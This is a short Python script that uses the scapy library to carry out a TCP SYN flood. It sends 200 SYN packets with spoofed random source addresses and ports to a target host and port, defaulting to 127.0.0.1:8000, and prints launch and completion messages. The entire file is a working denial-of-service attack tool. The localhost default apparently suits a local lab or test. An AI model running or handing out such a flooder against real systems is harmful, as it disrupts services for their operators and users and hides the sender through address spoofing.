import sys
import random
from scapy.all import IP, TCP, send

def launch_syn_flood(target_ip="127.0.0.1", target_port=8000, count=200):
    print(f"[!] Launching Layer-4 TCP SYN Flood against {target_ip}:{target_port}...")
    
    for _ in range(count):
        # Spoof random source IP and source port
        src_ip = f"192.168.1.{random.randint(10, 250)}"
        src_port = random.randint(1024, 65535)
        
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send(packet, verbose=False)
        
    print(f"[+] Transmitted {count} raw TCP SYN packets.")

if __name__ == "__main__":
    launch_syn_flood()